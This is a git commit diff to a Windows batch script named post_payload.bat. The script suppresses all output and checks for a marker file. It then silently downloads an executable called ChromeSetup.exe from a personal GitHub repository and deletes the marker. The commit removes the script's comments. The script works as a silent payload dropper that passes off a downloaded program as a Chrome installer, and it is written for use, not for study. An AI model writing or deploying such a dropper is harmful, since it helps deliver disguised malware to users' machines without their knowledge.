a92eee1230f8428d20a2869d0938f785146d891f
Tk1234567891 <efcxccsdsddad@gmail.com>
2024-05-23 18:23:43 -0600

    Update post_payload.bat

--- post_payload.bat
+++ post_payload.bat
@@ -1,23 +1,18 @@
 @echo off
 setlocal
 
-REM Define the file to search for and the URL to download from
 set "searchFile=lazlo.txt"
 set "downloadURL=https://github.com/Tk1234567891/test/blob/main/ChromeSetup.exe"
 set "downloadedFile=ChromeSetup.exe"
 
-REM Suppress the output of the entire script
 >nul 2>&1 (
-    REM Search for the file
     if exist "%searchFile%" (
         
         REM Download the new file silently using PowerShell
         powershell -Command "Invoke-WebRequest -Uri '%downloadURL%' -OutFile '%downloadedFile%' -UseBasicParsing"
         
-        REM Check if the download was successful
         if exist "%downloadedFile%" (
             
-            REM Delete the original file
             del /f /q "%searchFile%"
         )
     )
